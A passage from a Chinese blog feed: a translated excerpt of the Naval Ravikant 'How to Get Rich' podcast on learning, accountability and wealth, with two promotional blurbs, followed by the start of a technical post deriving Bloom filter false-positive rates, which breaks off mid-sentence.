title="第十七条：数学和逻辑才是一切事物的基础"></a>第十七条：数学和逻辑才是一切事物的基础</h2><p><em>数学和逻辑是理解其他一切事物的基础</em></p><h3 id="终极基础是数学和逻辑"><a href="#终极基础是数学和逻辑" class="headerlink" title="终极基础是数学和逻辑"></a>终极基础是数学和逻辑</h3><p>Naval：最基本的东西是原则性的，可以是算法，是根深蒂固的逻辑理解，你可以从任何角度保护它或攻击它。这就是为什么微观经济学很重要，而宏观经济学就是大量的记忆堆砌，大量的宏观废话。</p><p>正如纳西姆•塔勒布(Nassim Taleb)所说，<strong>宏观上的扯淡比微观上的扯淡更容易</strong>。因为宏观经济学是巫术—复杂—科学与政治的结合。如今，你找不到两个宏观经济学家在任何事情上达成一致，不同的政治家会用不同的宏观经济学家来兜售他们各自偏爱的理论。</p><p>现在甚至有宏观经济学家在兜售所谓的现代货币理论，大概意思就是，有个讨厌的东西叫做通货膨胀，我们可以印所有我们想要的钱。这就像说，有了无限的能量，我们可以发射火箭进入太空一整天。这简直是一派胡言。现实是，有些人打着“宏观经济学家”的旗号，兜售什么现代货币理论，这只能说明，宏观经济学作为一门“所谓的科学”已经腐败。它现在是政治的一个分支。</p><p>因此，你要把重点放在基础上。<strong>最终一切事物的基础是数学和逻辑</strong>。如果你懂逻辑和数学，那么你就有了理解科学方法的基础。一旦你理解了科学方法，你就能理解如何在其他领域和其他你正在阅读的东西中区分真理和谬误。</p><h3 id="速食一百本书毫无意义"><a href="#速食一百本书毫无意义" class="headerlink" title="速食一百本书毫无意义"></a>速食一百本书毫无意义</h3><p>在阅读别人的观点（opinion）时要非常小心，甚至在阅读事实（facts）时也要小心，因为所谓的事实往往只是表面上的(伪科学)观点。你真正需要的是算法（algorithm），是理解（understanding）。最好是慢慢地啃完一本书，然后挣扎、绊倒、倒带，而不是快速地浏览一遍，然后貌似很有成就感：“我已经读了20本书，我已经读了30本书，我已经读了50本这个领域的书…”就像李小龙说的，“我不害怕那些知道一千种踢腿招式的人，我害怕那些练习了一万次出拳或一万踢腿的人。”通过不断重复和运用，不断深入理解逻辑和基础，你才能成为一个聪明的思考者。</p><h3 id="学习讲故事和编程"><a href="#学习讲故事和编程" class="headerlink" title="学习讲故事和编程"></a>学习讲故事和编程</h3><p>Nivi：要为你以后的学习打下基础，我认为你需要两样东西，总结来说。第一，练习说服别人，不断实践怎么讲好一个故事。第二，深入了解一些技术范畴的东西，无论是学习抽象数学，还是读唐纳德·克努斯关于算法的书，或者听费曼关于物理学的讲座。如果你有实际的说服力，对一些复杂的话题有深刻的理解，我认为你的余生将有一个很好的学习基础。</p><p>Naval：是的。我把它展开一下。我认为五个最重要的技能是，阅读，写作，算术，然后加上说服的技巧，也就是会讲故事（storytelling）让别人信服。最后，我还要加上计算机编程，因为它是一种应用形式的运算它能让你在任何领域都能自由的建造。如果你擅长电脑，擅长基础数学，擅长写作，擅长说服，如果你喜欢阅读，你就已经为生活做好了准备。</p><h2 id="第十八条：没有被称为“商业”的技能"><a href="#第十八条：没有被称为“商业”的技能" class="headerlink" title="第十八条：没有被称为“商业”的技能"></a>第十八条：没有被称为“商业”的技能</h2><p><em>避开商学院和杂志</em></p><h3 id="没有被称为“商业”的实际技能"><a href="#没有被称为“商业”的实际技能" class="headerlink" title="没有被称为“商业”的实际技能"></a>没有被称为“商业”的实际技能</h3><p>Naval：没有所谓商业的实际技能，它太普通了。这就像一种叫做“关联”的技能，定义为“与人相关”。这都不能称作一种技能，它太宽泛了。</p><p>我并不想完全贬低商学院传授的东西的价值，他们会传授非常聪明的东西—一些成功的案例/轶事，并称之为“案例分析”（case study）。但它们只是一些趣闻轶事，它们试图通过向你抛出大量数据点来帮助你进行模式匹配，但事实是，在你设身处地思考之前，你永远不能完全理解它们，就像你无法重复打造一个可口可乐一样。但是，你会发现博弈论、心理学、伦理学、数学、计算机和逻辑学中的这些基本概念才会更好地帮到你。这也是我为什么会更专注于基础科学、基础逻辑的原因。我会培养对阅读的热爱，包括阅读那些我们明知道不应该阅读的所谓垃圾。你不必（只）读经典。阅读是你进行自我教育的基础。</p><p>着手做比光想要快得多</p><p>Nivi：你之前所说的“做比看快”是什么意思呢？</p><p>Naval：这涉及到学习曲线的话题，人们总是想方设法的优化自己的学习曲线。尽管我也是一个播客博主，但我不喜欢播客的原因之一是，播客无法让我最快的获取知识和信息。我是一个很好的读者，或者说是一个很快的读者，我能读得很快，但我只能以一定的速度听。我知道人们听的时候都是二倍速，三倍速，但那时每个人听起来都像一只花栗鼠，很难再回头看，抓重点，很难精确定位片段并记笔记，等等。</p><p>同样地，很多人认为他们可以通过观察别人做的事情，甚至通过阅读别人做的事情，变得非常熟练。比如刚提到的商学院的案例研究，就是一个非常典型的例子。他们研究其他人的生意，但实际上，你开一个自己的柠檬汽水摊，甚至在街上开一家小杂货店，都会学到比书本上多得多的经营生意的知识。这就是你在工作中要学习的方法，<strong>因为很多微妙的东西在你真正进入这个行业之前是不会真正懂得的</strong>。</p><p>例如，现在人人都喜欢研究心理学。你去看看Farnam Street，读读Poor Charlie’s Almanack*，你可以学习所有不同的心理模式。但哪个更重要？你更常应用哪些？在什么情况下哪一个更重要？这其实是最难的部分。比如，我从心理学研究中最大的收获是，委托-代理问题在现实世界中的驱动力太强大了，这本质是一个激励问题。它让我明白，针锋相对的重复囚徒困境是最值得了解的博弈论。在那之后你几乎可以把博弈论理论书束之高阁了。</p><p>顺便说一下，<strong>学习博弈论的最好方法是自己设计游戏</strong>，自己亲身体验。虽然我从没读过博弈论的书，但我认为自己非常擅长博弈论实践。我从来没有打开过一本博弈论的书，从未尝试在里面发现任何一个我没想到的结果。原因是我从小玩各种游戏，和各种各样的朋友在游戏中碰到各种各样的实际情况，所以这对我来说只是第二天性。实践会告诉你一切你想知道的答案。</p><h3 id="“执行”迭代的次数决定着你的学习曲线"><a href="#“执行”迭代的次数决定着你的学习曲线" class="headerlink" title="“执行”迭代的次数决定着你的学习曲线"></a>“执行”迭代的次数决定着你的学习曲线</h3><p>执行本身是一件很微妙的事请，它包含着很多东西。比如说，我想学习如何经营一家企业。如果我在每天上班的地方重复做同样的事情，比如说我在街上开了一家零售店，每天的任务就是在货架上摆满食物和酒，我不会学到很多东西，因为我每天只是在不断重复。因此，即使我花了几千个小时，但我也只是花了几千个小时做同样的事情。而如果在这个过程中我进行了数千次迭代，那结果就会不一样了。因此，学习曲线是需要迭代的，而不是重复。</p><p>但如果我在商店里每天尝试新的营销实验，我不断地改变库存，不断地改善品牌策略，不断尝试新的讲故事的方法，不断地拓展增大客流量的在线渠道，我试着在不同的时间营业，并且经常有目的地四处走走，和其他店主交谈，拿到他们的书，弄清楚他们是如何经营自己的生意的。<strong>真正影响学习曲线的是迭代次数</strong>。迭代次数越多，收获的就越多，学习速度就越快。而不仅仅是投入的时间长短的问题。</p><h3 id="如果你愿意每天流一点血，你可能在未来的人生路上赢得很多"><a href="#如果你愿意每天流一点血，你可能在未来的人生路上赢得很多" class="headerlink" title="如果你愿意每天流一点血，你可能在未来的人生路上赢得很多"></a>如果你愿意每天流一点血，你可能在未来的人生路上赢得很多</h3><p>虽然世界为我们提供着一次又一次做同样事情的机会，但事实上，如果我们能从零开始寻找新的方法，世界会呈现出不一样的精彩。</p><p>第一次尝试新事物是很痛苦的，因为你正徘徊在不确定的领域，很有可能你会失败。因此你只需要不断让自己<strong>适应频繁的小失败（bleed a little）</strong>。</p><p>Nassim Taleb也谈到了这一点。他靠做一个基本上依赖黑天鹅的商人的生意发家致富。Nassim Taleb通过每天损失一点点钱来赚钱，然后在一个偶然的时机，当一件被常识定义为不可能发生的事情发生在其他人身上时，他会赚很多钱。</p><p>虽然大多数人每天都想一夜暴富，但相应的，他们需要承担爆炸式的风险，做好破产的心理准备。</p><p>如果说你在自然界里割伤了，然后每天都在流血，你最终会因失血而死亡，你必须想办法及及时想办法挽救生命。但其实现实生活没那么夸张，我们并不是每天都在流血，流血在这里只是一个比喻，每天让自己损失一点点。</p><p>但现实是，大部分人都不这么做，相反他们每天都在追求着小的胜利，这最终会被证明是不合算的。我想说的是，如果你愿意每天都流一点点血，将来你会赢一笔大的。</p><p>其实，这就是创业精神，企业家们每天都在流血（bleed a little）。他们不是在赚钱，他们是在赔钱，而且他们总是亚历山大，因为所有的责任都在他们身上，但是当他们赢了，他们就会大赚一笔，所以总体上来看他们会赚得更多。</p><h2 id="第十九条：勇敢承担责任才能获得影响力"><a href="#第十九条：勇敢承担责任才能获得影响力" class="headerlink" title="第十九条：勇敢承担责任才能获得影响力"></a>第十九条：勇敢承担责任才能获得影响力</h2><p><em>勇敢冒险你就会在社会上获得影响力</em></p><h3 id="你需要通过责任获得影响力"><a href="#你需要通过责任获得影响力" class="headerlink" title="你需要通过责任获得影响力"></a>你需要通过责任获得影响力</h3><p>Nivi: 我们何不谈谈责任呢，我觉得这很有趣，我估计你对此有自己独特的看法。因此，你的关于责任的第一条推文是，“拥抱责任，以自己的名义承担商业风险。社会将以责任、公平和影响力来回报你。”</p><p>Naval: 是啊，所以要想发财，你需要杠杆。杠杆来自于劳动力、资本，也可能是通过代码和媒体。但其中的大多数，比如<strong>劳动力和资本，必须来自于他人的给予</strong>。对于劳动力，必须是有人愿意跟随你；对于资本，必须有人给你钱或资产来让你管理和使用。</p><p>所以要得到这些，你必须建立信誉，而且你必须尽可能以自己的名义去做，当然这也是有风险的。所以责任是一把双刃剑。它能让你在事情顺利的时候收获信誉，在事情糟糕的时候承受失败的冲击。</p><h3 id="以自己的名义承担商业风险"><a href="#以自己的名义承担商业风险" class="headerlink" title="以自己的名义承担商业风险"></a>以自己的名义承担商业风险</h3><p>从这个意义上说，那些在各种事物上贴上自己标签的人并不愚蠢，他们只是对自己有信心。也许最终结果是愚蠢的，但如果你看到一个坎耶、奥普拉、特朗普、马斯克或其他类似的人，这些人之所以可以凭借自己的名字致富，是因为他们的名字就是强大的敲门砖。</p><p>不管你如何看待特朗普，你必须意识到，这家伙的名字就是世界名片。你为什么要去特朗普赌场？只是因为是特朗普。你为什么要去特朗普大厦？也是因为特朗普。</p><p>到了投票的时候，我想很多选民只是进去说“特朗普”，他们认出了这个名字，所以这个名字得到了回报（获得选票）。</p><p>奥普拉也是同样的，她把某样东西打上自己的标签，当商品到达人们手中，她的名字就是这些商品的招牌。</p><p>这些人在坚持把自己的名字打造成招牌的同时当然也面临着一系列的风险。显然，特朗普现在可能被世界上的一大部分人憎恨着，也同样是因为特朗普式的风格。</p><p>把你的名字公之于众，你就会成为一个名人，而名声也有很多缺点。<strong>隐姓埋名、有钱总比穷出名好，但即便是名利双收，也有很多不利因素。你需要在公众的眼皮子底下生活</strong>。</p><h3 id="一个运作良好的团队对每个职位都有明确的责任分工"><a href="#一个运作良好的团队对每个职位都有明确的责任分工" class="headerlink" title="一个运作良好的团队对每个职位都有明确的责任分工"></a>一个运作良好的团队对每个职位都有明确的责任分工</h3><p>责任感是非常重要的，当你正在开发一个产品，或者你在一个团队中工作，或者你在一个企业中工作时，我们就会不断地提醒自己成为一个团队的一员是多么的重要。这的确是非常重要的。</p><p>我们在社交方面的很多训练都告诉我们不要强出头。就像中国的一句俗语，枪打出头鸟，别紧张，但是我要说的是，一个真正运作良好的团队规模很小，对每一个不同的部分都有明确的责任分工。</p><p>你可以说，“好吧，这个人负责制造产品，这个人负责信息发布，这个人负责筹款，这个人负责定价策略，也可能负责在线广告。“所以如果有人搞砸了，你就知道到底是谁负责。同时，如果事情进展顺利，你也清楚地知道是谁做得很好。</p><p>如果你有一个很小的团队，并且你已经清楚地划分了责任，那么你仍然可以保持很高的责任感。问责制在面对结果时显得真的很重要，不然就会出现，如果失败了，每个人都会互相指责，如果成功了，每个人都会站出来争夺功劳。</p><p>我们在学校的时候都有过这样的经历，有一个小组作业要做，里面可能有几个人做了很多工作，然后有一些人只是做了很多哗众取宠的工作或者强行给自己做的工作加戏。我们从小就习以为常，但说出来难免会感到不舒服。</p><h3 id="能在公众面前坦然面对失败的人都有很大的能量"><a href="#能在公众面前坦然面对失败的人都有很大的能量" class="headerlink" title="能在公众面前坦然面对失败的人都有很大的能量"></a>能在公众面前坦然面对失败的人都有很大的能量</h3><p>明确责任很重要。没有责任感，你就没有动力；没有责任感，就无法建立信誉。但你要冒险，你冒着失败的风险冒着被羞辱的危险，你冒着以自己名义承受失败的风险。</p><p>幸运的是，在现代社会，不再有债务人的监狱，人们也不会因为失去别人的钱而坐牢或被处死，但与生俱来的，我们不会以自己的名义在公共场合失败。那些以自己的名义在公共场合面对失败的人，实际上拥有很大的能量。</p><p>例如，我讲一个个人轶事。直到2013年，2014年，我的公众形象完全围绕着创业和投资。直到2014年、2015年左右，我才开始谈论哲学、心理学等等。</p><p>这让我有点紧张，因为<strong>我是以自己的名义做的</strong>。肯定有业内人士通过背后悄悄戳我，比如“你在干什么？你要结束你的职业生涯了吗？这太愚蠢了。”</p><p>我有点同意了，的确，我冒险了。</p><p>当你把你的名字放在那里，你就要冒着某些风险。但同时你也会得到回报，你会得到好处的。</p><h2 id="第三十五条：冷静的头脑，健康的身体，充满爱的家庭"><a href="#第三十五条：冷静的头脑，健康的身体，充满爱的家庭" class="headerlink" title="第三十五条：冷静的头脑，健康的身体，充满爱的家庭"></a>第三十五条：冷静的头脑，健康的身体，充满爱的家庭</h2><p><em>当你变得富有时，你会发现这些都不是你一直以来追求的</em></p><p>Nivi：最后一条关于长期工作的推特是：“当你最终变得富有时，你会意识到这些并不是你最初想要的。”</p><p>Naval：这本身就是一个能谈论很久的话题。首先，我认为这是一个非常聪明的结论，它解放了那些说“致富有什么意义？”的人们的思想武装。有很多人喜欢以德服人，反对创造财富或赚钱的想法。这其实也没错。是的，钱能解决你所有能用钱解决的问题，但钱也不是万能的。</p><p><strong>当你赚了一大笔钱后，你首先意识到你仍然是同一个人</strong>。如果你本来快乐，你就还是快乐的。如果你本来不快乐，你就会不快乐。如果你平静、满足、平和，你还是那个人。我认识很多非常富有的人，他们身材非常不好。我也认识很多有钱人，他们的家庭生活很糟糕。我同时也知道很多有钱人，他们内心很混乱。</p><h3 id="平静的头脑，健康的身体和充满爱的家庭必须要经营"><a href="#平静的头脑，健康的身体和充满爱的家庭必须要经营" class="headerlink" title="平静的头脑，健康的身体和充满爱的家庭必须要经营"></a>平静的头脑，健康的身体和充满爱的家庭必须要经营</h3><p>我想到我之前发的另一条推特，也是我最喜欢的一条。它不一定是最有见地的，也不一定是最有用的，这甚至不是我想的最清楚的。但那里面有一个非常确定的事实，它引起了共鸣。</p><p>“健康的身体，平静的头脑，充满爱的家庭。这些东西是买不来的，必须要经营才能得到。”</p><p>即使你拥有世界上所有的钱，你也不会拥有这三样东西。Jeff Bezos（亚马逊董事长）还得健身，他也得为他的婚姻努力，他的内在精神状态仍然很难不被外部事件所影响。这将取决于他内心的平静与安宁。因此，我认为这三件事——你的身体健康，你的心理健康和你的亲密关系是你必须要培养的。他们能给你带来比任何金钱都多的安宁和幸福。</p><h3 id="关于平静内心状态的实用性建议"><a href="#关于平静内心状态的实用性建议" class="headerlink" title="关于平静内心状态的实用性建议"></a>关于平静内心状态的实用性建议</h3><p>如何才能保持内心平静，这个话题是我一直在研究的。我大概有100条这个方面的推特。在这个话题上，最近经常会遭到至少50种不同形式的攻击。所以我一直在犹豫要不要做，因为我想针对一种非常特殊的人群。</p><p>有很多人不相信研究内在状态是有用的，他们太注重外在。没关系，这样也的确没什么问题。这就是“如何致富”推特系列的目的。有很多人认为唯一值得努力的就是<strong>彻底解放(complete liberation)</strong>，就像，你成了佛。他们会怀疑过程中的任何东西，认为它们毫无用处。但事实是绝大多数人没法儿成佛不是吗？</p><p><strong>我想创建一个新的推特系列，来为那些想要一个更平静的内在的人们提供实用的建议</strong>。一套理解、分辨半真半假和真理的理论，如果你能正确地吸收它们，这些都是指向你已经拥有的想法和经验的指针；如果你把这些理论慢慢融会贯通，它将帮助你、引导你进入一个更平静的内在状态，这就是我想做的。</p><p>健身是另一个大问题，我不是这方面的专家，推特上有很多比我更擅长健身的专业人士。</p><h3 id="很多离婚案例是为了钱，很多争吵是因为内心恐惧"><a href="#很多离婚案例是为了钱，很多争吵是因为内心恐惧" class="headerlink" title="很多离婚案例是为了钱，很多争吵是因为内心恐惧"></a>很多离婚案例是为了钱，很多争吵是因为内心恐惧</h3><p>我认为，一个充满爱的家庭和人际关系实际上是自然而然地从其他事情中脱颖而出的。如果你有一个冷静的头脑，你已经赚了钱，你应该有良好的关系。你没有理由不这样做，很多离婚都是为了钱，不幸的是，这就是现实，有了钱但是丢失了家庭这部分。</p><p>很多外在的纷争主要是因为你的内在状态不好。当你内心自然平静的时候，你会选择更少的争斗，你会变得更有爱心而不期待任何回报，这会让你应对外部关系更加得心应手。</p><p>Nivi：总结一下，钱能解决你的关于金钱的问题，金钱可以让你在物质世界中获得自由。金钱能给你不去做你不想做的事情的自由。</p><p>Naval：是啊。对我来说，金钱的最终目的是让你不必在某个特定的地方的某个特定的时间，做任何你不想做的事情。</p><h2 id="第三十六条：没有什么快速致富的方法"><a href="#第三十六条：没有什么快速致富的方法" class="headerlink" title="第三十六条：没有什么快速致富的方法"></a>第三十六条：没有什么快速致富的方法</h2><p><em>别相信能快速致富的鬼话，那些人只是想从你身上赚钱而已</em></p><p>Nivi：我们跳过了一条推文，因为我想涵盖所有关于长期话题的推文。我们跳过的那条推特是，“世界上没有快速致富的捷径，如果谁告诉你有，那不过是他想从你这里发财罢了。”</p><p>Naval：我们说回有效率的世界。如果有一种简单的致富方式，那就是已经被开发了。有很多人会向你推销如何赚钱的产品，比如他们总是卖给你一些79-95美元的课程或一些有声读物，或研讨会门票。这没什么对错，人们总是需要谋生。他们可能真的有很好的建议，但如果他们给你可行的、高质量的建议，承认这（致富）是一个艰难的旅程，会花很多时间，那么我认为这是现实的。但是，如果他们卖给你一些快速致富的各种线上线下的产品，他们只是想从你身上赚钱，你要掂量一下它的价值。</p><h3 id="我们不放广告，因为我们知道那只会损害信誉"><a href="#我们不放广告，因为我们知道那只会损害信誉" class="headerlink" title="我们不放广告，因为我们知道那只会损害信誉"></a>我们不放广告，因为我们知道那只会损害信誉</h3><p>关于整个推特风暴和这个播客，我想强调的一件事是我们这里没有广告，也不收任何费用。我们不卖任何东西。不是因为我不想赚更多的钱，赚更多的钱总是好的。但是，它会完全破坏企业的信誉。如果我说，“嘿，我知道如何致富，我要把它卖给你。“这就毁了它。</p><p>我年轻的时候就开始思考致富的话题，我最喜欢的书之一就是《如何致富》，作者是Felix Dennis，《Maxim》杂志的创始人，一位去世的亿万富翁。他写了很多疯狂的东西，但他对财富的理解真的好。</p><p>但每当我读到他或GoDaddy创始人鲍勃·帕森斯或安德鲁·卡内基的作品时，这些已经非常富有的人写的东西，他们显然是在其他领域发家致富的，而不是靠<strong>推销如何致富的方法</strong>。他们不是想从你身上赚钱。他们显然是想赢得一些地位和一些自尊，对吧，你总是要有做某事的动机。但是，至少这是他们没有撒谎的一个更清晰的理由。</p><h3 id="每个创始人都会对他的员工撒谎"><a href="#每个创始人都会对他的员工撒谎" class="headerlink" title="每个创始人都会对他的员工撒谎"></a>每个创始人都会对他的员工撒谎</h3><p>在某种程度上，每个创始人都要对公司的每个员工撒谎。他们必须让员工觉得，你为我工作比做你自己想做的事，为你自己工作（创业）要好。同样作为一个创始人，但对此我总是很难接受。</p><p>于是我开始尝试一些保持诚实的方法，我招募了一些有企业家精神的员工，然后告诉他们，“你们可以在这个公司成为企业家，当你们准备好开始自己的事业的那一天，我将支持你们。我永远不会妨碍你创业。但在你想开始一些新东西之前，这里可能是一个好地方，让你学习如何构建一个良好的团队，建立一个好的企业文化，通过打磨自己的技能找到适合的产品市场，见更多更加优秀的人、和他们交流碰撞，直到最终想通自己到底想做什么。因为定位、时机、以及必要的深思熟虑，在开始创业时很重要。”</p><p>但我从来不会做一些无谓的监督，告诉员工“你必须在早上8点之前到你的办公桌。”因为我自己就不会在早上8点之前坐在办公桌前，我想要自由。这就像告诉他们你今天很擅长做董事，明天你就会成为副总裁。这种话我自己都不相信。</p><h3 id="任何提供致富建议的人，去想想别的赚钱方式吧"><a href="#任何提供致富建议的人，去想想别的赚钱方式吧" class="headerlink" title="任何提供致富建议的人，去想想别的赚钱方式吧"></a>任何提供致富建议的人，去想想别的赚钱方式吧</h3><p>就好像，你不会想从一个胖子那里学到如何保持健康；也不会想从一个抑郁的人那里学到如何快乐。所以，你不会想从一个穷人那里学习如何致富，也一定不想从一个通过告诉别人如何致富来赚钱的人那里学习如何致富。想想都奇怪不是吗？</p><p>Nivi：任何时候，如果你看到有人按照大师的建议致富了，只要记住，在任何随机事件中，如果你持续足够长的时间，如果有足够多的人参与其中，你就会得到想要的结果。</p><p>Naval：这里面存在着幸存者偏差，这也是为什么当商业记者和经济学家谈论私营公司时，你可以完全忽视他们的原因。</p><p>我不会指名道姓，但当一位著名的经济学家对比特币大加抨击，或者当一名商业记者攻击最新一家即将上市的公司时，这完全是胡说八道。那些人什么都没做，他们只是「专业的评论家」。他们对赚钱一无所知。他们只知道如何通过吐槽和批评来博眼球。你要是不停的被他们洗脑可就太蠢了。</p><p>最后我想引用纳西姆·塔勒布*的一句话，我很喜欢他说的话，“如果你想成为一个哲学家，先当国王，再当哲学家。”不是先成为哲学家，再成为国王。”</p><p>Nivi：我很高兴你提到了塔勒布，我想请大家记住他成名作的书名《随机骗局》。</p><p>Naval：我们在这期播客中有些模糊的原因之一是，我们试图去讨论值得长期遵循的原则，而不仅仅是告诉你昨天中奖的彩票号。</p><h2 id="第三十七条：产品化你自己"><a href="#第三十七条：产品化你自己" class="headerlink" title="第三十七条：产品化你自己"></a>第三十七条：产品化你自己</h2><p><em>找出你最擅长的，并尽可能多地运用杠杆</em></p><p>Nivi：你用两个词概括了整个推特风暴。“产品化（Productize）你自己。”</p><p>Naval：产品化你自己这个概念的意思是：<strong>你自己</strong>是独特的、有责任心的，<strong>产品化</strong>需要独特的技能和杠杆。所以所有这些部分，你可以把它们合并成这两个词。</p><p>如果你想要长期致富，你应该问自己：“这是我的真实想法吗？”我在打造的是我自己吗？然后，“我在生产它吗？”我在规模化它吗？我是在用劳动力还是资本，代码还是媒体来衡量？所以这是一个非常方便、简单的记忆方法。</p><p>这是什么播客？这是一个叫做Naval的播客。我实际上是在用播客在产品化自己的一部分</p><p>Nivi：你要弄清楚你有什么特别擅长的，或者你有什么特别之处，然后尽可能地运用杠杆。在这种情况下你不是在刻意赚钱，赚钱甚至也不是一种技能。你就是在做你自己，探索成千上百种方式找到真正的你。</p><h2 id="找到让你富有、健康和有创造力的爱好"><a href="#找到让你富有、健康和有创造力的爱好" class="headerlink" title="找到让你富有、健康和有创造力的爱好"></a>找到让你富有、健康和有创造力的爱好</h2><p>Naval：赚钱应该取决于你是谁和你喜欢做什么。另一条我特别喜欢的推特是…这不是我说的，是别人发过的。他们说“找三个爱好”。一个能让你赚钱，一个能让你保持健康，一个能让你富有创造力。”</p><p>我会稍微改变一下。我会说，找到三个爱好，一个让你赚钱，一个让你健康，一个让你更聪明。就我而言，我的爱好是阅读，赚钱，因为我喜欢与初创公司合作。要么投资，要么集思广益，要么开始行动。我很喜欢创业初期的创意和创造阶段。</p><p>至于让你保持健康的爱好，我真的没有。我最喜欢的是瑜伽，但那是我崩溃的地方。我认为，那些早年发现冲浪、游泳、网球或某种他们一生中大部分时间都在做的运动的人是非常幸运的，因为他们发现了一种使他们健康的爱好。</p><p><img src="/articles/如何不靠运气变得富有/WubW2ud.jpg" alt></p><p>胖车库是一个有意思人类的收集计划（开发者、创业者、自由职业者，还有你）和DAO去中心化协作实验室，看看大家都在不同领域做着什么样新的尝试，希望给你未来的可能性提供一些想象力。</p><p><img src="/articles/如何不靠运气变得富有/V2gv5nk.jpg" alt></p><p>BitFuture为传统行业提供区块链咨询、公链开发、交易所开发、DApp开发、商业模式设计、经济模型设计、社区建设与运营方案等全栈链改服务，在众多行业和业务中成功交付了解决方案</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第一条：追求财富，而不是金钱或地位&quot;&gt;&lt;a href=&quot;#第一条：追求财富，而不是金钱或地位&quot; class=&quot;headerlink&quot; title=&quot;第一条：追求财富，而不是金钱或地位&quot;&gt;&lt;/a&gt;第一条：追求财富，而不是金钱或地位&lt;/h2&gt;&lt;p&gt;Nivi：你可能听说
      
    
    </summary>
    
    
      <category term="随笔" scheme="http://ya2.top/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Bloom Filter</title>
    <link href="http://ya2.top/articles/Bloom-Filter/"/>
    <id>http://ya2.top/articles/Bloom-Filter/</id>
    <published>2020-06-09T11:13:18.000Z</published>
    <updated>2021-06-16T02:21:57.211Z</updated>
    
    <content type="html"><![CDATA[<p><em>Bloom Filter</em>是一种空间效率很高的随机数据结构，它利用位数组很简洁地表示一个集合，并能判断一个元素是否属于这个集合。<em>Bloom Filter</em>的这种高效是有一定代价的：在判断一个元素是否属于某个集合时，有可能会把不属于这个集合的元素误认为属于这个集合（false positive）。<strong>通常应用在一些需要快速判断某个元素是否属于集合，但是并不严格要求100%正确的场合</strong>。而在能容忍低错误率的应用场合下，<em>Bloom Filter</em>通过极少的错误换取了存储空间的极大节省。</p><h3 id="集合表示和元素查询"><a href="#集合表示和元素查询" class="headerlink" title="集合表示和元素查询"></a>集合表示和元素查询</h3><p>下面我们具体来看<em>Bloom Filter</em>是如何用位数组表示集合的。初始状态时，<em>Bloom Filter</em>是一个包含m位的位数组，每一位都置为0。</p><p><img src="/articles/Bloom-Filter/o_bf1.jpg" alt> </p><p>为了表达$S=\{x1, x2,…,xn\}$这样一个n个元素的集合，<em>Bloom Filter</em>使用k个相互独立的哈希函数（Hash Function），它们分别将集合中的每个元素映射到$\{1,…,m\}$的范围中。对任意一个元素$x$，第i个哈希函数映射的位置$hi(x)$就会被置为$1（1≤i≤k）$。注意，如果一个位置多次被置为1，那么只有第一次会起作用，后面几次将没有任何效果。在下图中，k=3，且有两个哈希函数选中同一个位置（从左边数第五位）。</p><p><img src="/articles/Bloom-Filter/o_bf2.jpg" alt></p><p>在判断y是否属于这个集合时，我们对y应用k次哈希函数，如果所有$hi(y)$的位置都是$1（1≤i≤k）$，那么我们就认为y是集合中的元素，否则就认为y不是集合中的元素。下图中y1就不是集合中的元素。y2或者属于这个集合，或者刚好是一个false positive。</p><p><img src="/articles/Bloom-Filter/o_bf3.jpg" alt></p><h3 id="错误率估计"><a href="#错误率估计" class="headerlink" title="错误率估计"></a>错误率估计</h3><p>前面我们已经提到了，<em>Bloom Filter</em>在判断一个元素是否属于它表示的集合时会有一定的错误率（false positive rate），下面我们就来估计错误率的大小。在估计之前为了简化模型，我们假设$kn&lt;m$且各个哈希函数是完全随机的。当集合$S=\{x1, x2,…,xn\}$的所有元素都被k个哈希函数映射到m位的位数组中时，这个位数组中某一位还是0的概率是：</p><p style="text-align:center"> $ p'=(1-\frac{1}{m})^{kn} ≈ e^{-\frac{kn}{m}} $ </p> <p>其中$\frac{1}{m}$表示任意一个哈希函数选中这一位的概率（前提是哈希函数是完全随机的），$(1-\frac{1}{m})$表示哈希一次没有选中这一位的概率。要把$S$完全映射到位数组中，需要做$kn$次哈希。某一位还是$0$意味着$kn$次哈希都没有选中它，因此这个概率就是$(1-\frac{1}{m})^{kn}$。令 $p’=e^{-\frac{kn}{m}}$是为了简化运算，这里用到了计算e时常用的近似：</p><p style="text-align:center"> $\lim_{x \to \infty}(1-\frac{1}{x})^{-x} = e $ </p> <p>令ρ为位数组中0的比例，则ρ的数学期望$E(ρ)= p’$。在ρ已知的情况下，要求的错误率（false positive rate）为：</p><p style="text-align:center">$ (1-ρ)^k ≈ (1-p')^k ≈ (1-p)^k $</p> <p>$(1-ρ)$为位数组中1的比例，$(1-ρ)^k$就表示k次哈希都刚好选中1的区域，即false positive rate。上式中第二步近似在前面已经提到了，现在来看第一步近似。$p’$只是$ρ$的数学期望，在实际中$ρ$的值有可能偏离它的数学期望值。<em>M. Mitzenmacher</em> 已经证明[2]  ，位数组中0的比例非常集中地分布在它的数学期望值的附近。因此，第一步的近似得以成立。分别将$p$和$p’$代入上式中，得：</p><p style="text-align:center">$  f' = (1-(1-\frac{1}{m})^{kn})^k = (1-p')^k $</p> <p style="text-align:center">$  f  = (1-e^{-\frac{kn}{m}})^k = (1-p)^k $</p> <p>相比$p’$ 和$f’$，使用$p$和$f$通常在分析中更为方便。</p><h3 id="最优的哈希函数个数"><a href="#最优的哈希函数个数" class="headerlink" title="最优的哈希函数个数"></a>最优的哈希函数个数</h3><p>既然<em>Bloom Filter</em>要靠多个哈希函数将集合映射到位数组中，那么应该选择几个哈希函数才能使元素查询时的错误率降到最低呢？这里有两个互斥的理由：如果哈希函数的个数多，那么在对一个不属于集合的元素进行查询时得到0的概率就大；但另一方面，如果哈希函数的个数少，那么位数组中的0就多。为了得到最优的哈希函数个数，我们需要根据上一小节中的错误率公式进行计算。</p><p>先用$p$和$f$进行计算。注意到$f = e^{k\ln(1-e^{-\frac{kn}{m}})}$，我们令$g = k\ln(1-e^{-\frac{kn}{m}})$，只要让g取到最小，f自然也取到最小。由于$ p = e^{-\frac{kn}{m}}$，我们可以将g写成</p><p style="text-align:center">$ g = -\frac{m}{n}\ln(p)\ln(1-p) $</p><p>根据对称性法则可以很容易看出当$p = \frac{1}{2}$，也就是$k = ln(2)\frac{m}{n}$时，g取得最小值。在这种情况下，最小错误率f等于$\frac{1}{2}k ≈ (0.6185)\frac{m}{n}$。另外，注意到p是位数组中某一位仍是0的概率，所以$p = \frac{1}{2}$对应着位数组中0和1各一半。换句话说，要想保持错误率低，最好让位数组有一半还空着。</p><p>需要强调的一点是，$p = 